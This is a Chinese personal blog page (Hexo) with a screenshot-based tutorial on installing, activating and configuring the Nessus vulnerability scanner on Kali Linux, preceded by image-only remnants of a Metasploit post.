<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155015802.png" alt="image-20210806155015802"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155057118.png" alt="image-20210806155057118"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155110457.png" alt="image-20210806155110457"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155120901.png" alt="image-20210806155120901"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155129726.png" alt="image-20210806155129726"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" class="post-title-link" itemprop="url">NESSUS漏洞检测</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-04 20:31:48" itemprop="dateCreated datePublished" datetime="2021-08-04T20:31:48+08:00">2021-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-13 17:43:42" itemprop="dateModified" datetime="2022-04-13T17:43:42+08:00">2022-04-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="NESSUS漏洞检测"><a href="#NESSUS漏洞检测" class="headerlink" title="NESSUS漏洞检测"></a>NESSUS漏洞检测</h2><p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103053150.png" alt="image-20210804103053150"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103108664.png" alt="image-20210804103108664"></p>
<h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103131188.png" alt="image-20210804103131188"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103253607.png" alt="image-20210804103253607"></p>
<p>补充：不一定是/etc/init.d/nessused地址，如果你不是root，就不是这个地址。自己文件搜索查看地址（如）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210806173640700.png" alt="image-20210806173640700"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103355995.png" alt="image-20210804103355995"></p>
<p>补充：谷歌浏览器可能打不开，可以把http协议改为https协议或者直接用360浏览器打开</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103738543.png" alt="image-20210804103738543"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103621929.png" alt="image-20210804103621929"></p>
<p>（不要翻译网站，可能会跳转网址）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103908979.png" alt="image-20210804103908979"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104017520.png" alt="image-20210804104017520"></p>
<p>回到这个网站填激活码</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104048002.png" alt="image-20210804104048002"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104229941.png" alt="image-20210804104229941"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104259712.png" alt="image-20210804104259712"></p>
<p>激活完成</p>
<h3 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h3><p>将刚下载的插件all-2.0.tar.gz上传到kali系统/root下。（这里插件是2.0版本，如果不上传到root下，操作时需要进度该文件存放的地址路径下）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104842801.png" alt="image-20210804104842801"></p>
<p>它会自动检查</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104905954.png" alt="image-20210804104905954"></p>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>登录：</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105621814.png" alt="image-20210804105621814"></p>
<p>（英语不好，可以用谷歌浏览器翻译为中文网站使用）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105133629.png" alt="image-20210804105133629"></p>
<p>有众多扫描方式，自己按照自己需求打钩配置即可</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105255948.png" alt="image-20210804105255948"></p>
<p>点击可以查看详情</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105332136.png" alt="image-20210804105332136"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804110120912.png" alt="image-20210804110120912"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804110145277.png" alt="image-20210804110145277"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105422683.png" alt="image-20210804105422683"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105444083.png" alt="image-20210804105444083"></p>
<p>如果扫描需要登录的web网站</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105905216.png" alt="image-20210804105905216"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105925700.png" alt="image-20210804105925700"></p>
<p>设置好点击保存</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">86</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<!-- 页面动态背景 -->

<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>